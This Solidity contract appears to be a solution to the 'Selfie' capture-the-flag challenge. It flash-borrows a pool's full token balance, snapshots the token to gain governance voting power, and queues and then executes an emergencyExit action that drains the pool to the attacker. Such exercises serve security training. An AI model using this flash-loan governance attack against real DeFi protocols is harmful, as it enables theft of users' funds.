// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";

contract AttackSelfie {
    DamnValuableTokenSnapshot immutable dvToken;
    SimpleGovernance immutable governance;
    SelfiePool immutable pool;
    uint256 actionId;

    constructor(address _dvToken, address _governance, address _pool) {
        dvToken = DamnValuableTokenSnapshot(_dvToken);
        governance = SimpleGovernance(_governance);
        pool = SelfiePool(_pool);
    }

    function attack() external {
        address tokenAddress = address(dvToken);
        uint128 amount = uint128(pool.maxFlashLoan(tokenAddress));
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            tokenAddress,
            amount,
            ""
        );

        bytes memory emergencyExit = abi.encodeWithSignature(
            "emergencyExit(address)",
            msg.sender
        );
        actionId = governance.queueAction(address(pool), 0, emergencyExit);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        dvToken.snapshot();
        dvToken.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function attack2() external {
        governance.executeAction(actionId);
    }
}
